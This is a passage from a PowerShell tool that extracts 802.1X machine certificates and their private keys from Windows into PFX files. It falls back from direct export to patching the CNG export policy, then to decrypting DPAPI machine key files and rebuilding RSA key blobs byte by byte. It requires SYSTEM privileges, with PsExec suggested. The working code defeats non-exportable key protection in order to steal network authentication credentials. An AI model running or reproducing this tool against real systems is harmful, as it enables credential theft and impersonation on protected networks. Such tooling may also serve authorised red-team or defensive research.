            # Header: magic(4) + field1(4) + bitLength(4) + field3(4) + pubexp(4)
            # Then: Modulus + 8-byte pad + P + 4-byte pad + Q + 4-byte pad +
            #       DP + 4-byte pad + DQ + 4-byte pad + InverseQ + 4-byte pad + D
            # All in little-endian (CAPI format)
            $hdrBase = $rsaMagicOffset
            $bitLen = [BitConverter]::ToUInt32($decryptedBlob, $hdrBase + 8)
            $pubExp = [BitConverter]::ToUInt32($decryptedBlob, $hdrBase + 16)

            if ($bitLen -lt 512 -or $bitLen -gt 16384) {
                Write-Host "[-] Unexpected bit length: $bitLen" -ForegroundColor DarkYellow
                return $false
            }

            $modulusLen = [int]($bitLen / 8)
            $halfLen = [int]($bitLen / 16)
            Write-Host "[*] RSA key: $bitLen bits, modulus=$modulusLen bytes" -ForegroundColor Gray

            # Extract components at the padded offsets
            $off = $hdrBase + 20
            $modBytes = New-Object byte[] $modulusLen; [Array]::Copy($decryptedBlob, $off, $modBytes, 0, $modulusLen)
            $off += $modulusLen + 8  # 8-byte padding after modulus
            $pBytes = New-Object byte[] $halfLen; [Array]::Copy($decryptedBlob, $off, $pBytes, 0, $halfLen)
            $off += $halfLen + 4     # 4-byte padding after each half-length component
            $qBytes = New-Object byte[] $halfLen; [Array]::Copy($decryptedBlob, $off, $qBytes, 0, $halfLen)
            $off += $halfLen + 4
            $dpBytes = New-Object byte[] $halfLen; [Array]::Copy($decryptedBlob, $off, $dpBytes, 0, $halfLen)
            $off += $halfLen + 4
            $dqBytes = New-Object byte[] $halfLen; [Array]::Copy($decryptedBlob, $off, $dqBytes, 0, $halfLen)
            $off += $halfLen + 4
            $iqBytes = New-Object byte[] $halfLen; [Array]::Copy($decryptedBlob, $off, $iqBytes, 0, $halfLen)
            $off += $halfLen + 4
            $dBytes = New-Object byte[] $modulusLen; [Array]::Copy($decryptedBlob, $off, $dBytes, 0, $modulusLen)

            # Build a standard CAPI PRIVATEKEYBLOB (BLOBHEADER + RSAPUBKEY + key data, no padding)
            $keyDataLen = $modulusLen + $halfLen * 5 + $modulusLen
            [byte[]]$cspBlob = New-Object byte[] (20 + $keyDataLen)
            # BLOBHEADER: type=PRIVATEKEYBLOB(0x07) version=0x02 reserved=0 algid=CALG_RSA_KEYX(0xA400)
            $cspBlob[0] = 0x07; $cspBlob[1] = 0x02; $cspBlob[5] = 0xA4
            # RSAPUBKEY: magic=RSA2 bitlen pubexp
            $cspBlob[8] = 0x52; $cspBlob[9] = 0x53; $cspBlob[10] = 0x41; $cspBlob[11] = 0x32
            [Array]::Copy([BitConverter]::GetBytes([uint32]$bitLen), 0, $cspBlob, 12, 4)
            [Array]::Copy([BitConverter]::GetBytes([uint32]$pubExp), 0, $cspBlob, 16, 4)
            # Key data (contiguous, little-endian)
            $cOff = 20
            [System.Buffer]::BlockCopy($modBytes, 0, $cspBlob, $cOff, $modulusLen); $cOff += $modulusLen
            [System.Buffer]::BlockCopy($pBytes, 0, $cspBlob, $cOff, $halfLen); $cOff += $halfLen
            [System.Buffer]::BlockCopy($qBytes, 0, $cspBlob, $cOff, $halfLen); $cOff += $halfLen
            [System.Buffer]::BlockCopy($dpBytes, 0, $cspBlob, $cOff, $halfLen); $cOff += $halfLen
            [System.Buffer]::BlockCopy($dqBytes, 0, $cspBlob, $cOff, $halfLen); $cOff += $halfLen
            [System.Buffer]::BlockCopy($iqBytes, 0, $cspBlob, $cOff, $halfLen); $cOff += $halfLen
            [System.Buffer]::BlockCopy($dBytes, 0, $cspBlob, $cOff, $modulusLen)

            $pfxBytes = [PfxBuilder]::BuildPfxFromCspBlob($cspBlob, $certDer, $Password)
        }

        [System.IO.File]::WriteAllBytes($OutputPath, $pfxBytes)

        # Verify
        $verify = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
            $OutputPath, $Password,
            [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
        )
        if ($verify.HasPrivateKey) {
            $verify.Dispose()
            Write-Host "[+] Method 3 SUCCESS - DPAPI file decrypt + PFX build worked." -ForegroundColor Green
            return $true
        }
        $verify.Dispose()
        Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
        return $false
    }
    catch {
        Write-Host "[-] Method 3 failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
        return $false
    }
}

function Show-Summary {
    param(
        [PSCustomObject]$CertInfo,
        [string]$OutputPath,
        [string]$MethodUsed
    )

    Write-Host ""
    Write-Host "=============================================" -ForegroundColor Green
    Write-Host "  EXPORT SUCCESSFUL" -ForegroundColor Green
    Write-Host "=============================================" -ForegroundColor Green
    Write-Host ""
    Write-Host "  Subject:     $($CertInfo.Subject)" -ForegroundColor White
    Write-Host "  Issuer:      $($CertInfo.Issuer)" -ForegroundColor White
    Write-Host "  Thumbprint:  $($CertInfo.Thumbprint)" -ForegroundColor White
    Write-Host "  Template:    $($CertInfo.Template)" -ForegroundColor White
    Write-Host "  EKU:         $($CertInfo.EKU)" -ForegroundColor White
    Write-Host "  Expires:     $($CertInfo.NotAfter)" -ForegroundColor White
    Write-Host "  Method:      $MethodUsed" -ForegroundColor White
    Write-Host "  PFX Path:    $OutputPath" -ForegroundColor Cyan
    Write-Host "  PFX Size:    $((Get-Item $OutputPath).Length) bytes" -ForegroundColor White
    Write-Host ""
    Write-Host "  Use: certutil -dump `"$OutputPath`"" -ForegroundColor DarkGray
    Write-Host "  Or import with the configured password." -ForegroundColor DarkGray
    Write-Host ""
}

# ========================
# MAIN EXECUTION
# ========================

Write-Banner

# Check elevation
$elevation = Test-IsElevated
if (-not $elevation.IsAdmin -and -not $elevation.IsSystem) {
    Write-Host "[-] ERROR: This script requires Administrator or SYSTEM privileges." -ForegroundColor Red
    Write-Host "[-] Current user: $($elevation.UserName)" -ForegroundColor Red
    Write-Host "[-] Run from an elevated prompt or as SYSTEM (e.g., PsExec -s)." -ForegroundColor Red
    exit 1
}

$contextLabel = if ($elevation.IsSystem) { "SYSTEM" } elseif ($elevation.IsAdmin) { "Administrator" }
Write-Host "[+] Running as: $($elevation.UserName) ($contextLabel)" -ForegroundColor Green

# Resolve output directory
$OutputDir = (Resolve-Path $OutputDir -ErrorAction SilentlyContinue).Path
if (-not $OutputDir) {
    $OutputDir = (Get-Location).Path
}

# Find certificates
$allCerts = Find-8021xCerts
if (-not $allCerts) {
    Write-Host "[-] No certificates found. Exiting." -ForegroundColor Red
    exit 1
}

# Select target certificate
$targetCert = $null
if ($Thumbprint) {
    $targetCert = $allCerts | Where-Object { $_.Thumbprint -eq $Thumbprint }
    if (-not $targetCert) {
        Write-Host "[-] Certificate with thumbprint $Thumbprint not found." -ForegroundColor Red
        exit 1
    }
    Write-Host "[+] Targeted certificate by thumbprint: $($targetCert.Subject)" -ForegroundColor Green
}
else {
    $targetCert = Select-Certificate -CertList $allCerts
}

if (-not $targetCert) {
    Write-Host "[-] No certificate selected. Exiting." -ForegroundColor Red
    exit 1
}

Write-Host ""
Write-Host "[*] Target: $($targetCert.Subject)" -ForegroundColor Cyan
Write-Host "[*] Thumbprint: $($targetCert.Thumbprint)" -ForegroundColor Cyan

# Build output path
$safeName = $targetCert.Thumbprint.Substring(0, 8)
$outputPath = Join-Path $OutputDir "$($env:COMPUTERNAME)_$safeName.pfx"

# Try methods in order
$success = $false
$methodUsed = ""

# Method 1: Direct export
$success = Export-Method1-DirectExport -Cert $targetCert.Cert -OutputPath $outputPath -Password $PfxPassword
if ($success) { $methodUsed = "Method 1 - Direct .NET export" }

# Method 2: CNG export policy patch
if (-not $success) {
    $success = Export-Method2-PatchCNG -Cert $targetCert.Cert -OutputPath $outputPath -Password $PfxPassword
    if ($success) { $methodUsed = "Method 2 - CNG NCryptSetProperty patch" }
}

# Method 3: Raw key file + DPAPI
if (-not $success) {
    $success = Export-Method3-DPAPIKeyFile -Cert $targetCert.Cert -OutputPath $outputPath -Password $PfxPassword
    if ($success) { $methodUsed = "Method 3 - DPAPI LocalMachine key file decrypt" }
}

if ($success) {
    Show-Summary -CertInfo $targetCert -OutputPath $outputPath -MethodUsed $methodUsed
}
else {
    Write-Host ""
    Write-Host "=============================================" -ForegroundColor Red
    Write-Host "  ALL METHODS FAILED" -ForegroundColor Red
    Write-Host "=============================================" -ForegroundColor Red
    Write-Host ""
    Write-Host "  Possible causes:" -ForegroundColor Yellow
    Write-Host "  - Key is TPM-bound (hardware-protected, non-extractable)" -ForegroundColor Gray
    Write-Host "  - Key uses a third-party KSP with custom protection" -ForegroundColor Gray
    Write-Host "  - Insufficient privileges (need SYSTEM for DPAPI machine keys)" -ForegroundColor Gray
    Write-Host "  - Key file format not recognized" -ForegroundColor Gray
    Write-Host ""
    Write-Host "  Suggestions:" -ForegroundColor Yellow
    Write-Host "  - Run as SYSTEM: PsExec -s -i powershell" -ForegroundColor Gray
    Write-Host "  - Check if key is TPM-bound: certutil -store My <thumbprint>" -ForegroundColor Gray
    Write-Host "  - Try: certutil -exportPFX My <thumbprint> output.pfx" -ForegroundColor Gray
    Write-Host ""
    exit 1
}
